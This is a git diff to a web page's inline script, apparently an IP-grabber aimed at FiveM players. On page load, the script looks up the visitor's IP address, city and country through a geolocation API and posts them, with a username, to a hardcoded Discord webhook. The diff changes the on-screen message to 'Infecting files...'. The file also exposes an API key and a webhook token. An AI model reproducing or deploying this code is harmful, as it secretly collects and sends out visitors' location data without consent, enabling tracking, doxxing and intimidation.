@@ -66,7 +66,6 @@
 <script>
   const API_KEY = '704aa5f136d9423db0c64a593a6b7c27';
   const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489754745626431641/FlXQQJ9LxTYWEQrhWXph0bSfRzcUZGe8-1nYrM1KQjF0xRAm7kmNXI14YdHyMllEXAmZ';
-
   function fetchUserIpAndLocation(fivemUsername) {
     const ipBox = document.getElementById('ipBox');
     
@@ -79,8 +78,7 @@
           `Tracking IP: ${data.ip}\n` +
           `Fivem Username: ${fivemUsername || 'Unknown'}\n` +
           `Location: ${data.city}, ${data.country_name}\n` +
-          'Uploading files...';
-
+          'Infecting files...';
         // Send data to Discord webhook
         fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
@@ -93,7 +91,8 @@
         }).then(response => response.json())
           .catch(error => console.error('Error:', error));
       });
-	  
+  }
+  
   window.onload = function() {
     const fivemUsername = ''; // If you have a way to get the user's FiveM username, provide it here; otherwise, leave it empty.
     fetchUserIpAndLocation(fivemUsername);
